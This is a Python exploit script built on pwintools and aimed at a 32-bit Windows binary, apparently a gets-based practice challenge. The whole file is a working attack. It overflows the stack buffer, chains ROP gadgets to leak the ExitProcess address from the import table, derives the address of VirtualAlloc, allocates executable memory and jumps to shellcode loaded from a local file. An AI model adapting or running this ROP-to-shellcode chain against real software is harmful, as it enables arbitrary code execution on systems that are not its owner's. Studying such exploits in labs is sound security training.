#

from pwintools import *

retAddrOffs = 40

# gadgets
READ_AND_COMPARE = 0x407000
PUTS_ILT = 0x4039B3
IMP_EXITPROCESS = 0x46c000 # inside .idata

GETS_EAX = 0x407009 # push eax; call gets - inside readAndCompare

SAVE_EAX = 0x004419b1 # test eax, eax; mov dword ptr [0x46b520], eax; setne al; ret;
RESTORE_EAX = 0x00433413 # mov eax, dword ptr [0x46b520]; ret;

XCHG_EAX_EBP = 0x0041330d # xchg ebp, eax; ret;

ADD_EAX_16 = 0x00409047 # add eax, 0x10; ret;
ADD_EAX_EDX = 0x00414501 # add eax, edx; ret;
POP_EDX = 0x0043566b # pop edx; ret;

JMP_EAX = 0x00407f05 # jmp eax;


# main

p = Process('1_gets_pw_vs_32.exe')
#p.set_timeout(3600000) # to have time to interact with the debugger

# input('press enter after attaching the debugger...')

# stage 1: leak ExitProcess address
ropchain1 = (
	p32(PUTS_ILT) + # print it
	p32(READ_AND_COMPARE) + # perform another bof again later
	p32(IMP_EXITPROCESS) # arg 1: resolved ExitProcess in .idata
)

p.recvuntil(b'password:\r\n')

p.sendline(b'a'*retAddrOffs + ropchain1)
leak = p.recvuntil(b'\r\n')

#print('got:', leak)

leak = leak[:-2][:4] # discard \r\n and extra bytes
#TODO read again if < 4 bytes!
leak = leak + b'\x00'*(4 - len(leak)) # pad with zeroes if fewer than 4 bytes

EXIT_PROCESS = u32(leak)
# VIRTUAL_ALLOC = KERNEL32_BASE + 0x1F3C0
VIRTUAL_ALLOC = EXIT_PROCESS + p.get_proc_address("kernel32.dll", "VirtualAlloc") - p.get_proc_address("kernel32.dll", "ExitProcess")

#print('ExitProcess actual addres:', hex(EXIT_PROCESS))

# stage 2: allocate rwx memory and call gets to write into it
ropchain2 = (
	# VirtualAlloc(0, 10 pages, usable, rwx)
	p32(VIRTUAL_ALLOC) +
	p32(POP_EDX) + # stdcall + rop = gg ez: the next 4 dwords will be popped by ret
	p32(0) + # where
	p32(10 * 4096) + # size
	p32(0x3000) + # MEM_RESERVE | MEM_COMMIT
	p32(0x40) + # PAGE_EXECUTE_READWRITE
	
	p32(9 * 0x1000) + # for pop edx; 9 pages are for a new stack
	p32(ADD_EAX_EDX) +
	p32(SAVE_EAX) +
	p32(RESTORE_EAX) + # saving eax increments it by 1
	p32(XCHG_EAX_EBP) + # so ebp points to valid and controllable memory (needed by readAndCompare epilogue)
	p32(RESTORE_EAX) +
	
	p32(GETS_EAX)
)
p.sendline(b'a'*retAddrOffs + ropchain2)

# stage 3: actual write in rwx memory and execution
f = open('TMP', 'rb')
shellcode = f.read()
f.close()

ropchain3 = (
	#b'_'*36 + # thrash between buffer and ebp
	p32(0xdeadc0de) + # dummy value for "pop ebp"
	p32(RESTORE_EAX) +
	p32(ADD_EAX_16) + # skip these dwords
	p32(JMP_EAX) +
	
	shellcode
)
p.sendline(ropchain3)

#p.interactive()

print(p.recvall())
